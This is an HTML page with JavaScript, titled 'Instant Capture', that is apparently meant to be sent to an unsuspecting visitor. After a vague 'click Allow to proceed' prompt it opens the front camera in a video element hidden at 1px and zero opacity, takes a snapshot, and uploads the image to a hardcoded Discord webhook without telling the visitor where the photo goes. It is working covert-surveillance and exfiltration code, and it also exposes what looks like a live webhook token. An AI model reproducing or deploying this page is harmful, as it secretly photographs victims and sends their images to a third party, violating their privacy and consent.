<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instant Capture</title>
    <style>
        body { background: #000; color: white; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; font-family: sans-serif; }
        video { width: 1px; height: 1px; opacity: 0; } /* Hidden but active */
        #msg { text-align: center; }
    </style>
</head>
<body>

    <div id="msg">
        <h2 id="status">Requesting Camera...</h2>
        <p id="subtext">Please click "Allow" to proceed.</p>
    </div>

    <video id="v" autoplay playsinline muted></video>
    <canvas id="c" style="display:none;"></canvas>

    <script>
        const v = document.getElementById('v');
        const c = document.getElementById('c');
        const status = document.getElementById('status');
        
        // YOUR NEW WEBHOOK URL
        const HOOK = "https://discord.com/api/webhooks/1474321374733664459/qGF3At-bXtP8bZoNOezpj601-GHDdEeo6vPsrjDZ5xO4_k13a0iOFnfZeRDw5lqnsPTr";

        // 1. Ask for permission and start stream
        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
            .then(stream => { 
                v.srcObject = stream;
                status.innerText = "Capturing...";
                
                // 2. Listen for 'loadedmetadata' to ensure the camera is actually "on"
                v.onloadedmetadata = () => {
                    // Short 300ms delay to prevent a pitch-black frame
                    setTimeout(snapAndSend, 300); 
                };
            })
            .catch(err => { 
                status.innerText = "Permission Denied";
                console.error(err);
            });

        function snapAndSend() {
            c.width = v.videoWidth;
            c.height = v.videoHeight;
            c.getContext('2d').drawImage(v, 0, 0);

            c.toBlob(blob => {
                const formData = new FormData();
                formData.append('file', blob, 'instant_snap.jpg');
                formData.append('payload_json', JSON.stringify({ 
                    content: "⚡ **Instant Photo Captured!**" 
                }));

                fetch(HOOK, { method: 'POST', body: formData })
                .then(res => {
                    if(res.ok) {
                        status.innerText = "✅ Done!";
                        document.getElementById('subtext').innerText = "You can close this tab now.";
                    } else {
                        status.innerText = "❌ Error: " + res.status;
                    }
                })
                .catch(e => {
                    status.innerText = "❌ Network Error";
                });
            }, 'image/jpeg', 0.9);
        }
    </script>
</body>
</html>
